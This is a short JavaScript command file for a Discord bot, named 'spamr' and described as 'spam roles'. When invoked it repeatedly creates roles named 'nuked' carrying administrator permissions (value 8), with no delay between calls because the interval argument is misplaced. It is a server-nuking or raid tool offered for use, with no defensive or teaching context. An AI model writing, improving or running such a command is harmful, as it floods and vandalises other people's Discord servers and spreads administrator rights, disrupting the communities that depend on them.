const Discord = module.require("discord.js");
module.exports.run = async (bot, messages, args) => {

             var Role = "nuked";
             setInterval(function(){
             messages.guild.createRole({

                name: "nuked",
                color: "#FFFFFF",
                permissions: [8]
                },1 * 1000)
                });

            console.log(`creating roles ${Role}`)
}
module.exports.help = {
    name: "spamr",
    desc: "spam roles"

}

